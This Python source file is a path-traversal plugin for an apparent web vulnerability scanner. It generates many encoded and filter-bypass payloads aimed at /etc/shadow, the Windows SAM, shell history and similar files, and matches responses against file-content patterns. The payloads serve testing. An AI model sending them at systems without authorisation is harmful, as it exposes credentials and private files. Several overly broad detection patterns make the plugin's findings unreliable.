"""
Directory Traversal detection plugin
"""

import re
from typing import List, Dict, Any

from vulnmind.plugins.base import ParameterPlugin
from vulnmind.core.models import VulnType, SeverityLevel


class DirectoryTraversalPlugin(ParameterPlugin):
    """Directory Traversal vulnerability detection plugin"""
    
    def __init__(self):
        super().__init__()
        self.vuln_type = VulnType.DIRECTORY_TRAVERSAL
        self.severity = SeverityLevel.HIGH
        
        # File content patterns for common system files
        self.file_patterns = [
            # Linux/Unix system files
            r"root:.*?:0:0:",  # /etc/passwd
            r"daemon:.*?:/usr/sbin/nologin",
            r"bin:.*?:/bin/sh",
            
            # Windows system files
            r"\[boot loader\]",  # boot.ini
            r"timeout=\d+",  # boot.ini
            r"\[operating systems\]",  # boot.ini
            r"Microsoft Windows \[Version",  # Windows version
            
            # Common config files
            r"<\?xml.*?\?>",  # XML files
            r"<!DOCTYPE html",  # HTML files
            r"#.*?Configuration.*?file",  # Config file comments
            r"mysql.*?password",  # Database configs
            
            # Log files
            r"\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}",  # Timestamp format
            r"\[.*?\] .*? - .*? \d{3} \d+",  # Apache log format
            
            # Source code patterns
            r"<\?php",  # PHP files
            r"import.*?from.*?['\"]",  # Python/JS imports
            r"#include\s*<.*?>",  # C/C++ includes
        ]
        
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE | re.MULTILINE) 
                                 for pattern in self.file_patterns]
    
    def get_payloads(self) -> List[str]:
        """Get directory traversal payloads"""
        # Common system files to target
        target_files = [
            # Linux/Unix
            "etc/passwd",
            "etc/shadow",
            "etc/hosts",
            "etc/hostname",
            "etc/issue",
            "etc/group",
            "etc/fstab",
            "etc/crontab",
            "proc/version",
            "proc/cpuinfo",
            "proc/meminfo",
            "proc/self/environ",
            "var/log/messages",
            "var/log/auth.log",
            "home/.bashrc",
            "home/.bash_history",
            "root/.bash_history",
            "usr/local/apache2/conf/httpd.conf",
            "etc/apache2/apache2.conf",
            "etc/httpd/conf/httpd.conf",
            
            # Windows
            "windows/system32/drivers/etc/hosts",
            "windows/system.ini",
            "windows/win.ini",
            "winnt/system32/drivers/etc/hosts",
            "boot.ini",
            "autoexec.bat",
            "config.sys",
            "windows/system32/config/sam",
            "windows/repair/sam",
            "windows/php.ini",
            "windows/my.ini",
            "program files/mysql/my.ini",
        ]
        
        payloads = []
        
        # Generate traversal payloads for each target file
        for target in target_files:
            # Basic traversal
            payloads.extend([
                f"../{target}",
                f"../../{target}",
                f"../../../{target}",
                f"../../../../{target}",
                f"../../../../../{target}",
                f"../../../../../../{target}",
                f"../../../../../../../{target}",
                f"../../../../../../../../{target}",
            ])
            
            # Windows backslash traversal
            payloads.extend([
                f"..\\{target.replace('/', '\\\\')}",
                f"..\\..\\{target.replace('/', '\\\\')}",
                f"..\\..\\..\\{target.replace('/', '\\\\')}",
                f"..\\..\\..\\..\\{target.replace('/', '\\\\')}",
            ])
            
            # URL encoded
            payloads.extend([
                f"..%2F{target}",
                f"..%2F..%2F{target}",
                f"..%2F..%2F..%2F{target}",
                f"..%5C{target.replace('/', '%5C')}",  # Windows
            ])
            
            # Double URL encoded
            payloads.extend([
                f"..%252F{target}",
                f"..%252F..%252F{target}",
                f"..%255C{target.replace('/', '%255C')}",  # Windows
            ])
            
            # Unicode encoded
            payloads.extend([
                f"..%u002F{target}",
                f"..%u002F..%u002F{target}",
                f"..%u005C{target.replace('/', '%u005C')}",  # Windows
            ])
            
            # Null byte injection (for older systems)
            payloads.extend([
                f"../{target}%00",
                f"../../{target}%00.jpg",
                f"../../../{target}%00.txt",
            ])
        
        # Absolute path attempts
        for target in target_files[:10]:  # Limit to reduce payload count
            if target.startswith(('etc/', 'var/', 'proc/', 'home/', 'root/')):
                payloads.append(f"/{target}")
                payloads.append(f"//{target}")
            elif target.startswith('windows/'):
                payloads.append(f"C:/{target}")
                payloads.append(f"C:\\{target.replace('/', '\\\\')}")
        
        # Bypass attempts
        bypass_payloads = [
            # Dot bypass
            "....//etc/passwd",
            "....\\\\windows\\\\win.ini",
            
            # Filter bypass
            "..;/etc/passwd",
            "..;\\windows\\win.ini",
            
            # Case variation
            "../ETC/PASSWD",
            "..\\WINDOWS\\WIN.INI",
            
            # Mixed slashes
            "..\\../etc/passwd",
            "../..\\windows\\win.ini",
            
            # Current directory
            "./../../etc/passwd",
            ".\\..\\..\\windows\\win.ini",
            
            # Multiple slashes
            "..//etc/passwd",
            "..\\\\windows\\\\win.ini",
            
            # Overlong UTF-8
            "..%c0%af..%c0%afetc/passwd",
            
            # Question mark bypass
            "../?/../../etc/passwd",
        ]
        
        payloads.extend(bypass_payloads)
        
        return payloads
    
    def detect_vulnerability(self, response_text: str, payload: str) -> bool:
        """Detect directory traversal vulnerability"""
        # Check for file content patterns
        for pattern in self.compiled_patterns:
            if pattern.search(response_text):
                return True
        
        # Check for specific file contents
        file_indicators = {
            # /etc/passwd indicators
            'passwd': ['root:', 'daemon:', 'bin:', 'sys:', 'nobody:', '/bin/sh', '/bin/bash', ':0:0:'],
            
            # Windows files
            'win.ini': ['[fonts]', '[extensions]', '[mci extensions]', '[files]'],
            'boot.ini': ['[boot loader]', 'timeout=', '[operating systems]'],
            'system.ini': ['[386Enh]', '[drivers]', '[boot]'],
            
            # Config files
            'hosts': ['127.0.0.1', 'localhost', '::1'],
            'httpd.conf': ['ServerRoot', 'DocumentRoot', 'Listen', 'LoadModule'],
            'php.ini': ['engine =', 'short_open_tag', 'memory_limit'],
            
            # Log files
            'log': ['[error]', '[warn]', '[info]', '[debug]'],
        }
        
        response_lower = response_text.lower()
        payload_lower = payload.lower()
        
        # Check if we're targeting a specific file and found its content
        for file_type, indicators in file_indicators.items():
            if file_type in payload_lower:
                for indicator in indicators:
                    if indicator.lower() in response_lower:
                        return True
        
        # Generic file content indicators
        generic_indicators = [
            'root:x:0:0:',  # /etc/passwd format
            '[boot loader]',  # boot.ini
            '127.0.0.1',  # hosts file
            'serverroot',  # Apache config
            'documentroot',  # Apache config
            '<?php',  # PHP files
            '#include',  # C/C++ files
            'import ',  # Python files
            '<!doctype',  # HTML files
        ]
        
        for indicator in generic_indicators:
            if indicator in response_lower:
                return True
        
        # Check for error messages that might indicate file access attempts
        error_indicators = [
            'permission denied',
            'access denied',
            'file not found',
            'no such file',
            'cannot open',
            'failed to open',
            'invalid file',
            'directory not found'
        ]
        
        for error in error_indicators:
            if error in response_lower and any(trav in payload_lower for trav in ['../', '..\\', '%2f', '%5c']):
                # Lower confidence for error messages
                return False  # We'll handle this in calculate_confidence
        
        return False
    
    def calculate_confidence(self, response_text: str, payload: str) -> float:
        """Calculate confidence for directory traversal detection"""
        confidence = 0.2  # Base confidence
        
        response_lower = response_text.lower()
        payload_lower = payload.lower()
        
        # High confidence for specific file contents
        high_confidence_patterns = [
            r"root:.*?:0:0:",  # /etc/passwd
            r"\[boot loader\]",  # boot.ini
            r"127\.0\.0\.1.*?localhost",  # hosts file
            r"serverroot.*?documentroot",  # Apache config
        ]
        
        for pattern in high_confidence_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                confidence += 0.6
                break
        
        # Medium confidence indicators
        medium_indicators = [
            'root:', 'daemon:', 'bin:', 'sys:',  # passwd file
            '[fonts]', '[extensions]',  # Windows ini files
            'memory_limit', 'engine =',  # php.ini
            '<?php', '#!/bin/'  # Source files
        ]
        
        for indicator in medium_indicators:
            if indicator in response_lower:
                confidence += 0.3
                break
        
        # Check for file-specific content matching payload
        if 'passwd' in payload_lower and ('root:' in response_lower or ':0:0:' in response_lower):
            confidence += 0.4
        elif 'win.ini' in payload_lower and ('[fonts]' in response_lower or '[extensions]' in response_lower):
            confidence += 0.4
        elif 'boot.ini' in payload_lower and '[boot loader]' in response_lower:
            confidence += 0.4
        elif 'hosts' in payload_lower and '127.0.0.1' in response_lower:
            confidence += 0.3
        
        # Lower confidence for error messages (might indicate filtering)
        error_indicators = ['permission denied', 'access denied', 'file not found']
        for error in error_indicators:
            if error in response_lower:
                confidence = max(0.1, confidence - 0.3)
                break
        
        # Boost confidence for multiple file indicators
        file_indicator_count = 0
        all_indicators = ['root:', '[boot', '127.0.0.1', 'serverroot', '<?php', 'memory_limit']
        for indicator in all_indicators:
            if indicator in response_lower:
                file_indicator_count += 1
        
        if file_indicator_count > 1:
            confidence += 0.2
        
        return min(confidence, 1.0)
    
    def get_description(self) -> str:
        """Get vulnerability description"""
        return (
            "Directory Traversal (Path Traversal) vulnerability allows attackers "
            "to access files and directories outside the web root folder by "
            "manipulating file path parameters with sequences like '../'."
        )
    
    def get_remediation(self) -> str:
        """Get remediation advice"""
        return (
            "Implement proper input validation and sanitization for file paths. "
            "Use whitelist-based validation for allowed files and directories. "
            "Avoid using user input directly in file system operations. "
            "Use chroot jails or similar containment mechanisms. Implement "
            "proper access controls and file permissions."
        )
    
    def get_cwe_id(self) -> int:
        """Get CWE ID for Directory Traversal"""
        return 22
    
    def get_references(self) -> List[str]:
        """Get reference URLs"""
        return [
            "https://owasp.org/www-community/attacks/Path_Traversal",
            "https://cwe.mitre.org/data/definitions/22.html",
            "https://portswigger.net/web-security/file-path-traversal"
        ]
